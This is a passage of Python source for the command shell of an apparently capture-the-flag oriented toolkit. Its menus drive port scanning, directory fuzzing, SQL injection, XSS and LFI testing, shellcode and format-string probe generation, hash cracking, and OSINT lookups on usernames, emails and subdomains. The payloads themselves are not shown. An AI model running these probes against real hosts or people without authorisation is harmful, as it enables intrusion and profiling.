        path = self.session.save()
        ok(f"Saved: {path}")
        self.running = False

    def _flag(self, args):
        if args: self.session.flag(' '.join(args))
        else: err("Usage: flag <value>")

    def _note(self, args):
        if not args: err("Usage: note <title>"); return
        title = args[0]
        content = ask("Content: ")
        self.session.note(title, content)

    def _target(self, args):
        if args: self.session.target(args[0])
        else: err("Usage: target <host>")

    def _save(self, _):
        ok(f"Saved: {self.session.save()}")

    def _export(self, _):
        path = f"nebula_report_{int(time.time())}.html"
        self.session.export_html(path)

    def _scan(self, args):
        if not args: err("Usage: scan <host>"); return
        host = args[0]
        info(f"Scanning {host}...")
        open_ports = self.net.port_scan(host)
        if open_ports:
            print(f"\n  Open ports on {host}:")
            for port, svc in sorted(open_ports.items()):
                print(f"  [{G}{port}{RESET}] {svc}")
        else:
            warn("No common ports open.")
        self.session.result("net", {"host": host, "ports": open_ports})

    def _fuzz(self, args):
        if not args: err("Usage: fuzz <url>"); return
        found = self.net.dir_fuzz(args[0])
        print(f"\n  Found {len(found)} paths.")
        self.session.result("web", {"type": "fuzz", "url": args[0], "found": found})

    def _sqli(self, args):
        if not args: err("Usage: sqli <url>"); return
        url, param = args[0], (args[1] if len(args) > 1 else "id")
        results = self.net.sqli_test(url, param)
        print(f"\n  {len(results)} potential SQLi vulnerabilities found.")
        self.session.result("web", {"type": "sqli", "results": results})

    def _xss(self, args):
        if not args: err("Usage: xss <url>"); return
        url, param = args[0], (args[1] if len(args) > 1 else "q")
        results = self.net.xss_test(url, param)
        print(f"\n  {len(results)} reflected XSS payloads found.")
        self.session.result("web", {"type": "xss", "results": results})

    def _encode(self, args):
        if len(args) < 2: print("  Usage: encode <type> <data>\n  Types: base64 hex rot13 morse binary"); return
        enc_type, data = args[0].lower(), ' '.join(args[1:])
        enc = {
            "base64": Crypto.b64_enc,
            "hex":    Crypto.hex_enc,
            "rot13":  Crypto.rot13,
            "morse":  Crypto.morse_enc,
            "binary": Crypto.text_to_bin,
            "atbash": Crypto.atbash,
        }.get(enc_type)
        if enc: ok(f"Result: {enc(data)}")
        else:   err(f"Unknown type: {enc_type}")

    def _decode(self, args):
        if len(args) < 2: print("  Usage: decode <type> <data>\n  Types: base64 hex rot13 morse binary auto"); return
        dec_type, data = args[0].lower(), ' '.join(args[1:])
        if dec_type == "auto":
            results = Crypto.auto_decode(data)
            for method, val in results.items():
                ok(f"[{method}] {val[:100]}")
            if not results: warn("No decodings found.")
            return
        dec = {
            "base64": lambda d: Crypto.b64_dec(d).decode('utf-8', errors='replace'),
            "hex":    lambda d: Crypto.hex_dec(d).decode('utf-8', errors='replace'),
            "rot13":  Crypto.rot13,
            "morse":  Crypto.morse_dec,
            "binary": Crypto.bin_to_text,
            "atbash": Crypto.atbash,
        }.get(dec_type)
        if dec:
            try: ok(f"Result: {dec(data)}")
            except Exception as e: err(f"Decode error: {e}")
        else: err(f"Unknown type: {dec_type}")

    def _hash(self, args):
        if len(args) < 2: print("  Usage: hash <algo> <data>\n  Algos: md5 sha1 sha256 sha512 all"); return
        algo, data = args[0].lower(), ' '.join(args[1:])
        if algo == "all":
            for a, h in Crypto.hash_all(data).items():
                print(f"  [{a:<8}] {h}")
        else:
            try: ok(Crypto.hash_data(data, algo))
            except Exception as e: err(str(e))

    def _identify(self, args):
        if not args: err("Usage: identify <hash>"); return
        types = Crypto.hash_identify(args[0])
        ok(f"Possible types: {', '.join(types)}") if types else warn("Could not identify.")

    def _caesar(self, args):
        if not args: err("Usage: caesar <text>"); return
        text = ' '.join(args)
        results = Crypto.caesar_brute(text)
        print("\n  Caesar brute-force (top 10):")
        for shift, dec, _ in results[:10]:
            flag = f" {Y}← possible!{RESET}" if any(kw in dec.lower() for kw in ["flag","ctf","key"]) else ""
            print(f"  [shift {shift:>2}] {dec[:60]}{flag}")

    # ── Module entrypoints ────────────────────────────────

    def _crypto_module(self, _):
        print(f"\n{C}  ── CRYPTO MODULE ──{RESET}")
        print("  [1] Caesar  [2] Vigenere  [3] XOR  [4] RSA  [5] Hash  [6] Encoding  [0] Back")
        while True:
            c = ask()
            if c == "0": break
            elif c == "1": self._mod_caesar()
            elif c == "2": self._mod_vigenere()
            elif c == "3": self._mod_xor()
            elif c == "4": self._mod_rsa()
            elif c == "5": self._mod_hash()
            elif c == "6": self._mod_encoding()
            else: err("Invalid option")

    def _mod_caesar(self):
        print("  [1] Encrypt  [2] Decrypt  [3] Brute")
        a = ask()
        if a == "1":
            t, s = ask("Text: "), int(ask("Shift: ") or "0")
            ok(Crypto.caesar_enc(t, s))
        elif a == "2":
            t, s = ask("Text: "), int(ask("Shift: ") or "0")
            ok(Crypto.caesar_dec(t, s))
        elif a == "3":
            t = ask("Ciphertext: ")
            for s, d, _ in Crypto.caesar_brute(t)[:8]:
                print(f"  [shift {s:>2}] {d[:60]}")

    def _mod_vigenere(self):
        print("  [1] Encrypt  [2] Decrypt  [3] Crack")
        a = ask()
        if a == "1":
            ok(Crypto.vig_enc(ask("Plaintext: "), ask("Key: ")))
        elif a == "2":
            ok(Crypto.vig_dec(ask("Ciphertext: "), ask("Key: ")))
        elif a == "3":
            ct = ask("Ciphertext: ")
            kl = int(ask("Key length: ") or "0")
            if kl:
                key = Crypto.vig_crack(ct, kl)
                ok(f"Key: {key}")
                ok(f"Decrypted: {Crypto.vig_dec(ct, key)[:100]}")

    def _mod_xor(self):
        print("  [1] XOR with key  [2] Brute force single byte")
        a = ask()
        if a == "1":
            data = bytes.fromhex(ask("Data (hex): "))
            key  = int(ask("Key (0-255): ") or "0")
            r    = Crypto.xor_byte(data, key)
            ok(f"Hex: {r.hex()}")
            ok(f"Text: {r.decode('utf-8', errors='replace')}")
        elif a == "2":
            data = bytes.fromhex(ask("Data (hex): "))
            for k, dec, _ in Crypto.xor_brute(data)[:5]:
                print(f"  [key=0x{k:02x}] {dec.decode('utf-8', errors='replace')[:60]}")

    def _mod_rsa(self):
        print("  [1] Decrypt  [2] Compute d  [3] Factorize n")
        a = ask()
        try:
            if a == "1":
                c, d, n = int(ask("c: ")), int(ask("d: ")), int(ask("n: "))
                m = Crypto.rsa_dec(c, d, n)
                ok(f"Plaintext (int): {m}")
                try: ok(f"Plaintext (str): {m.to_bytes((m.bit_length()+7)//8,'big').decode()}")
                except Exception: pass
            elif a == "2":
                p, q, e = int(ask("p: ")), int(ask("q: ")), int(ask("e: "))
                keys = Crypto.rsa_keygen(p, q, e)
                for k, v in keys.items(): print(f"  {k} = {v}")
            elif a == "3":
                n = int(ask("n: "))
                r = Crypto.factorize(n)
                if r: ok(f"p={r[0]}, q={r[1]}")
                else: warn("Could not factorize (n too large for trial division)")
        except ValueError as e:
            err(f"Input error: {e}")

    def _mod_hash(self):
        print("  [1] Compute  [2] Identify  [3] Crack")
        a = ask()
        if a == "1":
            data, algo = ask("Data: "), ask("Algo (md5/sha1/sha256/all): ").lower()
            if algo == "all":
                for k, v in Crypto.hash_all(data).items(): print(f"  [{k:<8}] {v}")
            else:
                ok(Crypto.hash_data(data, algo))
        elif a == "2":
            h = ask("Hash: ")
            types = Crypto.hash_identify(h)
            ok(f"Types: {', '.join(types)}") if types else warn("Unknown")
        elif a == "3":
            h, algo = ask("Hash: "), ask("Algo: ").lower()
            r = Crypto.hash_crack(h, algo)
            ok(f"Cracked: {r}") if r else warn("Not in common password list.")

    def _mod_encoding(self):
        print("  encode/decode: base64 hex rot13 morse binary atbash | auto")
        print("  [1] Encode  [2] Decode  [3] Auto-decode  [4] Detect")
        a = ask()
        if a == "1":
            enc_type, data = ask("Type: ").lower(), ask("Data: ")
            self._encode([enc_type, data])
        elif a in ("2", "3", "4"):
            data = ask("Data: ")
            if a == "3":
                for method, val in Crypto.auto_decode(data).items():
                    ok(f"[{method}] {val[:100]}")
            elif a == "4":
                detected = []
                if re.match(r'^[A-Za-z0-9+/]*={0,2}$', data) and len(data) % 4 == 0: detected.append("base64")
                if re.match(r'^[0-9a-fA-F]+$', data) and len(data) % 2 == 0: detected.append("hex")
                if re.match(r'^[01\s]+$', data): detected.append("binary")
                if re.match(r'^[\.\-\/\s]+$', data): detected.append("morse")
                ok(f"Detected: {', '.join(detected) or 'none'}") 
            else:
                enc_type = ask("Type: ").lower()
                self._decode([enc_type, data])

    def _web_module(self, _):
        print(f"\n{C}  ── WEB MODULE ──{RESET}")
        print("  [1] SQLi  [2] XSS  [3] LFI  [4] Dir Fuzz  [5] Header Check  [0] Back")
        while True:
            c = ask()
            if c == "0": break
            elif c == "1":
                url, param = ask("URL: "), ask("Param (id): ") or "id"
                r = self.net.sqli_test(url, param)
                self.session.result("web", {"sqli": r})
            elif c == "2":
                url, param = ask("URL: "), ask("Param (q): ") or "q"
                r = self.net.xss_test(url, param)
                self.session.result("web", {"xss": r})
            elif c == "3":
                url, param = ask("URL: "), ask("Param (file): ") or "file"
                r = self.net.lfi_test(url, param)
                self.session.result("web", {"lfi": r})
            elif c == "4":
                url = ask("URL: ")
                r = self.net.dir_fuzz(url)
                self.session.result("web", {"fuzz": r})
            elif c == "5":
                url = ask("URL: ")
                r = self.net.header_check(url)
                print(f"  Server: {r['server']}")
                print(f"  Present: {G}{', '.join(r['present']) or 'none'}{RESET}")
                print(f"  Missing: {Y}{', '.join(r['missing']) or 'none'}{RESET}")

    def _forensics_module(self, _):
        print(f"\n{C}  ── FORENSICS MODULE ──{RESET}")
        print("  [1] Identify  [2] Strings  [3] Hidden Data  [4] Metadata  [5] Carve  [6] LSB  [0] Back")
        while True:
            c = ask()
            if c == "0": break
            elif c == "1":
                r = Forensics.identify(ask("File: "))
                for k, v in r.items(): print(f"  {k}: {v}")
            elif c == "2":
                path, ml = ask("File: "), int(ask("Min length (4): ") or "4")
                strs = Forensics.strings(path, ml)
                flaggy = [s for s in strs if any(kw in s.lower() for kw in ["flag","ctf","key","pass","secret"])]
                if flaggy:
                    ok(f"Interesting strings ({len(flaggy)}):")
                    for s in flaggy[:20]: print(f"  >> {G}{s}{RESET}")
                print(f"\n  Total: {len(strs)} strings. First 30:")
                for s in strs[:30]: print(f"  {s}")
            elif c == "3":
                r = Forensics.hidden(ask("File: "))
                if r["findings"]:
                    print(f"  {len(r['findings'])} findings:")
                    for f in r["findings"]:
                        print(f"  [{f['type']}] {f.get('value', f.get('file', ''))} @ {f['offset']}")
                else:
                    warn("No hidden data found.")
            elif c == "4":
                for k, v in Forensics.metadata(ask("File: ")).items():
                    print(f"  {k}: {v}")
            elif c == "5":
                path, out = ask("File: "), ask("Output dir (carved): ") or "carved"
                carved = Forensics.carve(path, out)
                ok(f"Carved {len(carved)} files to {out}/")
            elif c == "6":
                path = ask("Image: ")
                data = Forensics.lsb_extract(path)
                if data:
                    ok(f"LSB data ({len(data)} bytes):")
                    print(f"  Hex:  {data[:64].hex()}")
                    print(f"  Text: {data[:64].decode('utf-8', errors='replace')}")

    def _pwn_module(self, _):
        print(f"\n{C}  ── PWN MODULE ──{RESET}")
        print("  [1] Cyclic pattern  [2] Find offset  [3] Shellcode  [4] Format string probes")
        print("  [5] Pack/Unpack  [6] Bad chars  [7] NOP sled  [8] ELF analysis  [0] Back")
        while True:
            c = ask()
            if c == "0": break
            elif c == "1":
                n = int(ask("Length (200): ") or "200")
                p = Pwn.cyclic(n)
                ok(f"Pattern: {p.decode()}")
            elif c == "2":
                val = ask("Crash value (hex 0x... or text): ")
                try:
                    target = bytes.fromhex(val[2:]) if val.startswith("0x") else val.encode()
                    offset = Pwn.offset(target)
                    ok(f"Offset: {offset}") if offset >= 0 else warn("Not found in pattern.")
                except Exception as e:
                    err(str(e))
            elif c == "3":
                print("  Available: x86, x64")
                arch = ask("Arch: ").lower() or "x86"
                sc = Pwn.shellcode(arch)
                ok(f"Shellcode ({len(sc)} bytes):")
                print(f"  Hex:  {sc.hex()}")
                print(f"  Repr: {repr(sc)}")
            elif c == "4":
                n = int(ask("Count (20): ") or "20")
                pre = ask("Prefix (AAAA): ") or "AAAA"
                for p in Pwn.fmt_probes(n, pre)[:20]:
                    print(f"  {p}")
            elif c == "5":
                print("  [1] Pack 32  [2] Pack 64  [3] Unpack 32  [4] Unpack 64")
                a = ask()
                try:
                    if a == "1":
                        ok(Pwn.pack32(int(ask("Value: "), 0)).hex())
                    elif a == "2":
                        ok(Pwn.pack64(int(ask("Value: "), 0)).hex())
                    elif a == "3":
                        d = bytes.fromhex(ask("Hex: "))
                        ok(str(Pwn.unpack32(d)))
                    elif a == "4":
                        d = bytes.fromhex(ask("Hex: "))
                        ok(str(Pwn.unpack64(d)))
                except Exception as e:
                    err(str(e))
            elif c == "6":
                sc  = bytes.fromhex(ask("Shellcode (hex): "))
                bad = bytes.fromhex(ask("Bad chars (hex, e.g. 000a0d): "))
                hits = Pwn.bad_chars(sc, bad)
                ok("No bad chars!") if not hits else warn(f"Bad chars at offsets: {hits}")
            elif c == "7":
                n = int(ask("Length (32): ") or "32")
                ok(f"NOP sled: {Pwn.nop_sled(n).hex()}")
            elif c == "8":
                r = Pwn.analyze_elf(ask("ELF path: "))
                for k, v in r.items(): print(f"  {k}: {v}")

    def _osint_module(self, _):
        print(f"\n{C}  ── OSINT MODULE ──{RESET}")
        print("  [1] Username search  [2] Email perms  [3] Google dorks  [4] Page recon")
        print("  [5] DNS lookup  [6] Subdomain enum  [0] Back")
        osint = OSINT()
        while True:
            c = ask()
            if c == "0": break
            elif c == "1":
                u = ask("Username: ")
                r = osint.username_search(u)
                self.session.result("osint", {"username": u, "results": r})
            elif c == "2":
                f, l, d = ask("First name: "), ask("Last name: "), ask("Domain: ")
                for p in osint.email_perms(f, l, d):
                    print(f"  {p}")
            elif c == "3":
                target = ask("Domain/target: ")
                for dork in osint.dorks(target):
                    print(f"  {dork}")
                print(f"\n  Search at: https://google.com")
            elif c == "4":
                url = ask("URL: ")
                r = osint.page_recon(url)
                print(f"  Server:  {r['server']}")
                print(f"  Emails:  {r['emails']}")
                print(f"  Socials: {r['socials']}")
            elif c == "5":
                d = ask("Domain: ")
                r = self.net.dns_lookup(d)
                for k, v in r.items(): print(f"  {k}: {v}")
            elif c == "6":
                d = ask("Domain: ")
                found = self.net.subdomain_enum(d)
                ok(f"Found {len(found)} subdomains.")
                self.session.result("osint", {"subdomains": found})


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    import argparse
    ap = argparse.ArgumentParser(prog="nebula", description="Nebula CTF Toolkit")
    ap.add_argument("--module", "-m", choices=MODULE_NAMES, default=None)
    ap.add_argument("--version", "-v", action="store_true")
    ap.add_argument("--no-banner", action="store_true")
    ap.add_argument("--session", "-s", default=None)
    args = ap.parse_args()

    if args.version:
        print(f"Nebula CTF Toolkit v{VERSION}")
        return

    shell = Shell()
    if args.session:
        shell.session.load(args.session)

    if not args.no_banner:
        print(BANNER_ART)

    module_map = {
        "web":       shell._web_module,
        "crypto":    shell._crypto_module,
        "forensics": shell._forensics_module,
        "pwn":       shell._pwn_module,
        "osint":     shell._osint_module,
    }

    if args.module and args.module in module_map:
        module_map[args.module]([])
    else:
        shell.start()


if __name__ == "__main__":
    main()
